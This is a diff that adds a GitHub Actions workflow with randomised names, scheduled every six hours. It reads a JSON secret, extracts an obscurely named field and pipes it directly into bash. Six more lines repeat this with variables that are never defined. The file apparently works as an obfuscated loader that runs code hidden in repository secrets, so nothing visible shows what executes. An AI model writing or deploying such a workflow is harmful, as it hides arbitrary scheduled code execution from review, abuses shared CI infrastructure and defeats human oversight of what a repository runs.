@@ -1,0 +1,23 @@
+name: rengongchangjie
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '3 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: rengongchangjie
+        env:
+          xiou75523: ${{ secrets.xiou75523 }}
+        run: |
+          echo $xiou75523 | jq -r .fz7886 | /bin/bash
+          echo $e0 | jq -r .dtxp103 | /bin/bash
+          echo $kdno39288 | jq -r .cc041 | /bin/bash
+          echo $j96308 | jq -r .hqlsp07707 | /bin/bash
+          echo $vfr1 | jq -r .xihoi99 | /bin/bash
+          echo $fmv530 | jq -r .eay281 | /bin/bash
+          echo $kygbv46782 | jq -r .hhvt461 | /bin/bash
+
